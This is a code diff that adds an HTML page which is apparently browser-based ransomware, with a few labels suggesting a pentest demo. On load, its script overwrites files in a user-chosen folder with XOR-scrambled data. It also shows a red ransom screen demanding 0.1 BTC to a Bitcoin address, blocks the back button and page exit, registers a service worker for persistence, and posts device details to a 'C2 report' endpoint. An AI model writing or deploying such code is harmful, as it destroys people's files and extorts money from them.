@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🔒 FILES LOCKED</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="manifest" href="manifest.json">
+    <style>
+        *{margin:0;padding:0;}
+        body{background:#FF0000;color:#fff;font-family:Arial;text-align:center;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;}
+        h1{font-size:36px;margin-bottom:20px;}
+        p{font-size:20px;margin:10px 0;}
+        button{padding:15px 30px;font-size:20px;background:#0f0;color:#000;border:none;border-radius:10px;cursor:pointer;margin:10px;}
+        #password{display:none;}
+    </style>
+</head>
+<body>
+    <h1>🔒 YOUR FILES ENCRYPTED! 🔒</h1>
+    <p>सबै फाइल locked! Pay 0.1 BTC</p>
+    <p><b>bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</b></p>
+    <button onclick="showPassword()">🔑 UNLOCK (Password)</button>
+    <button onclick="payBitcoin()">💰 PAY BITCOIN</button>
+    
+    <div id="password">
+        <input type="password" id="pass" placeholder="Enter Unlock Code" style="padding:15px;font-size:18px;width:250px;margin:10px;">
+        <br><button onclick="checkPassword()">Verify</button>
+    </div>
+    
+    <script>
+        // ENCRYPT FILES (File System Access API)
+        async function encryptFiles() {
+            try {
+                const dirHandle = await window.showDirectoryPicker();
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file') {
+                        const file = await entry.getFile();
+                        const data = await file.arrayBuffer();
+                        // Simple XOR encryption
+                        const encrypted = new Uint8Array(data).map(b => b ^ 0xAA);
+                        // Save as .locked
+                        const writable = await entry.createWritable();
+                        await writable.write(encrypted);
+                        await writable.close();
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // BLOCK BACK BUTTON
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.go(1);
+        };
+        
+        // PREVENT RELOAD/EXIT
+        window.onbeforeunload = () => "Files locked! Pay to unlock!";
+        
+        // BOOT PERSISTENCE (Service Worker)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js');
+        }
+        
+        // AUTO ENCRYPT ON LOAD
+        encryptFiles();
+        
+        function showPassword() {
+            document.getElementById('password').style.display = 'block';
+        }
+        
+        function checkPassword() {
+            if (document.getElementById('pass').value === 'pentest2026') {
+                alert('✅ Unlocked! (Test)');
+                window.location.href = 'index.html';
+            } else {
+                alert('❌ Wrong! Pay Bitcoin first!');
+            }
+        }
+        
+        function payBitcoin() {
+            window.open('bitcoin:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh?amount=0.1');
+        }
+        
+        // C2 REPORT
+        fetch('report.php', {
+            method: 'POST',
+            body: JSON.stringify({
+                device: navigator.userAgent,
+                status: 'locked',
+                timestamp: Date.now()
+            })
+        });
+    </script>
+</body>
+</html>
